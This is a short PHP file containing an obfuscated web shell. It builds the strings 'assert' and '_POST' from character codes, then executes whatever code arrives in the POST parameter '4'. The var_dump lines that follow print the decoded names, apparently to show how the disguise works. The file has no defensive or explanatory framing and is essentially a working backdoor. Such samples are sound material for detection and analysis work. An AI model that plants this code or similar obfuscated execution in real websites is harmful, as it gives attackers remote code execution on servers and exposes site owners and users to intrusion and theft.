<?php
$a=range(1,200);$b=chr($a[96]).chr($a[114]).chr($a[114]).chr($a[100]).chr($a[113]).chr($a[115]);
$b(${chr($a[94]).chr($a[79]).chr($a[78]).chr($a[82]).chr($a[83])}[chr($a[51])]);

var_dump($b);
echo '<br/>';
var_dump($a);
echo '<br/>';
var_dump(chr($a[94]).chr($a[79]).chr($a[78]).chr($a[82]).chr($a[83]));
echo '<br/>';
var_dump(chr($a[51]));
?>